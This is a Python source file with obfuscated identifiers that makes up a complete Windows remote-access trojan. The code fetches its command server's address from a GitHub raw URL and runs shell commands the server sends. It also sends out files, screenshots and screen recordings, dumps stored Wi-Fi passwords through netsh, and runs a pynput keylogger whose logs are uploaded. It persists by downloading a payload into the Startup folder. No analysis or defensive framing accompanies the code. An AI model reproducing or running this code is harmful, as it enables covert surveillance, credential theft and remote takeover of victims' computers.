import subprocess,socket,time,requests,os,logging,BMhhBpuPRMMHeENMyfio
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
LheoLxikFVSEEVlVSKLIuM = ""
rPHPHbgdWRG = ""
lnWIcSPbmpAfxcYCH = "12.12.24.3"
IppHUXUbkneeL = "!"
haebrhtIRRWcFFj = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
xiUKDbRP = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
jumaZGYlMvThVhikkzP = os.path.expanduser("~\\AppData\\Local\\")
def lYsaVihKUrfBzzWrWra(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def uEfxJAno(s):
	oBsNTmbaR = s.recv(1024)
	if len(oBsNTmbaR)==0:
		return True
	XkntUjcrJdbyVK = oBsNTmbaR.decode("utf-8").replace("\n","")
	if not XkntUjcrJdbyVK.startswith(IppHUXUbkneeL):
		proc = subprocess.run(XkntUjcrJdbyVK, shell=True, capture_output=True)
		PaSJWNAoYegIpZszjR = proc.stdout + proc.stderr
		s.send(PaSJWNAoYegIpZszjR)
		return
	uGyrRaUYygVHqPys = XkntUjcrJdbyVK.split(" ")[0][1:]
	args = " ".join(XkntUjcrJdbyVK.split()[1:]).split()
	if uGyrRaUYygVHqPys == "download":
		lxIxUAHxslLMSyju(s, XkntUjcrJdbyVK)
	elif uGyrRaUYygVHqPys == "screenshot":
		CrCynTPaxqhWyFZF(s)
	elif uGyrRaUYygVHqPys == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif uGyrRaUYygVHqPys == "update":
		nuxMYXnWEi(s)
	elif uGyrRaUYygVHqPys == "wifi":
		EtteQIzy(s)
	elif uGyrRaUYygVHqPys == "screenrecord":
		dUkaiJAwGdMYXxjGnld(s, args)
def lxIxUAHxslLMSyju(s, XkntUjcrJdbyVK):
	LUFpfzAmloTVaiiTHOhHXn = XkntUjcrJdbyVK.replace(IppHUXUbkneeL+"download ","").split(",")
	PaSJWNAoYegIpZszjRs = ""
	for f in LUFpfzAmloTVaiiTHOhHXn:
		PaSJWNAoYegIpZszjRs += bZKLHiFVEGamOwYGNBjsfa(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(PaSJWNAoYegIpZszjRs, "utf-8"))
def CrCynTPaxqhWyFZF(s):
	BMhhBpuPRMMHeENMyf = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	uNbuxBouGThBuCc = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	BMhhBpuPRMMHeENMyf.save(uNbuxBouGThBuCc)
	BMhhBpuPRMMHeENMyf.close()
	r = bZKLHiFVEGamOwYGNBjsfa(uNbuxBouGThBuCc, "api/sscap")
	os.remove(uNbuxBouGThBuCc)
	s.send(bytes(r,"utf-8"))
def dUkaiJAwGdMYXxjGnld(s, args):
	nDYmQalAieiWIu = 15
	if not args == []:
		try: nDYmQalAieiWIu = int(args[0])
		except: pass
	EFbeDTbM = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	VjeiuHPADKmjDcCAEdGTY = []
	fps = 11
	numFrames = nDYmQalAieiWIu * fps
	for _ in range(numFrames):
		VjeiuHPADKmjDcCAEdGTY.append(ImageGrab.grab(bbox=None, all_screens=True))
	BMhhBpuPRMMHeENMyfio.mimsave(EFbeDTbM, VjeiuHPADKmjDcCAEdGTY, fps=fps, quality=8)
	bZKLHiFVEGamOwYGNBjsfa(EFbeDTbM, "api/file")
def bZKLHiFVEGamOwYGNBjsfa(IMbBUGOaiAK, YvpDzASm, SEBAJsqYAsnCNcz=None):
	if not os.path.isfile(IMbBUGOaiAK):
		return "[!] 404: "+IMbBUGOaiAK+"\n"
	headers = {"user":os.getlogin()}
	if SEBAJsqYAsnCNcz is not None:
		headers = {**headers, **SEBAJsqYAsnCNcz}
	requests.post("http://"+LheoLxikFVSEEVlVSKLIuM+":5555/"+YvpDzASm,
		files={"file":open(IMbBUGOaiAK, "rb")},
		headers=headers)
	return "[+] 200:\n"
def nuxMYXnWEi(s):
	h, p, v = RzFbudbWeitBtSzE(True)
	if (v != lnWIcSPbmpAfxcYCH):
		DlCYklaqGFaMNfCDSij(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def EtteQIzy(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	jdXzmwUMrwvezLmRzNGD = ""
	for p in profiles:
		try: jdXzmwUMrwvezLmRzNGD+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: jdXzmwUMrwvezLmRzNGD+=f"    {p} - N/A\n"
	s.send(jdXzmwUMrwvezLmRzNGD)
def DlCYklaqGFaMNfCDSij(uCuZfHquuP):
	sOKLENZpD = os.path.basename(__file__)
	fileType = sOKLENZpD.split(".")[-1]
	aLCScOJZVWYXYvUcXSO = sOKLENZpD.split(".")[0]+"."+uCuZfHquuP+".pyw" if fileType.startswith("py") else ".exe"
	gUfTuFFHb = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), aLCScOJZVWYXYvUcXSO)
	if not os.path.isfile(gUfTuFFHb):
		with open(gUfTuFFHb, "w+") as f:
			f.write(requests.get(xiUKDbRP+"file."+ "pyw" if gUfTuFFHb.split(".")[-1].startswith("py") else "exe").text)
def RzFbudbWeitBtSzE(force=False):
	global LheoLxikFVSEEVlVSKLIuM, rPHPHbgdWRG
	if force or LheoLxikFVSEEVlVSKLIuM == "" or rPHPHbgdWRG == "":
		oBsNTmbaR = requests.get(haebrhtIRRWcFFj).text.replace("\n","").split(":")
		LheoLxikFVSEEVlVSKLIuM = oBsNTmbaR[0].strip()
		rPHPHbgdWRG = oBsNTmbaR[1].strip()
		uCuZfHquuP = oBsNTmbaR[2].strip()
	return LheoLxikFVSEEVlVSKLIuM, rPHPHbgdWRG, uCuZfHquuP
def GySaTvdoB():
	try:
		qqilkyfUQeg = "settings.xpb"
		BKdrGpZZe = sorted([file for file in os.listdir(jumaZGYlMvThVhikkzP) if os.path.isfile(jumaZGYlMvThVhikkzP+"\\"+file) and file.endswith(qqilkyfUQeg.split(".")[-1])])
		if qqilkyfUQeg in BKdrGpZZe:
			BKdrGpZZe.remove(qqilkyfUQeg)
		RLEzWmTBCFyvjw = os.path.join(jumaZGYlMvThVhikkzP,qqilkyfUQeg)
		if len(BKdrGpZZe) > 0:
			with open(RLEzWmTBCFyvjw, "ab+") as f:
				for file in BKdrGpZZe:
					temp = os.path.join(jumaZGYlMvThVhikkzP,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		bZKLHiFVEGamOwYGNBjsfa(RLEzWmTBCFyvjw, "api/log")
		if os.path.isfile(RLEzWmTBCFyvjw):
			os.remove(RLEzWmTBCFyvjw)
	except:
		pass
def MocMeBFeYN():
	logging.basicConfig(filename=(jumaZGYlMvThVhikkzP+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def YDIQhmgyEYIqRCD(k):
		logging.info(str(k))
	k=Listener(on_press=YDIQhmgyEYIqRCD)
	iBmcjXtDeCbvxCvWkroh = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in iBmcjXtDeCbvxCvWkroh:
		l.setLevel(logging.CRITICAL)
	k.start()
def yoMBaWfgCTdCLmunBxD():
	h, p, v = RzFbudbWeitBtSzE()
	GySaTvdoB()
	if lnWIcSPbmpAfxcYCH != v:
		DlCYklaqGFaMNfCDSij(v)
	MocMeBFeYN()
	wgbBXLhmh = bytes(("(old)"if lnWIcSPbmpAfxcYCH!=v else "")+"["+lnWIcSPbmpAfxcYCH+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				ONtGNEZYruGflTfeVbCRVIa=False
				try:
					s=lYsaVihKUrfBzzWrWra(h, p)
					while not ONtGNEZYruGflTfeVbCRVIa:
						s.send(wgbBXLhmh)
						ONtGNEZYruGflTfeVbCRVIa=uEfxJAno(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
yoMBaWfgCTdCLmunBxD()
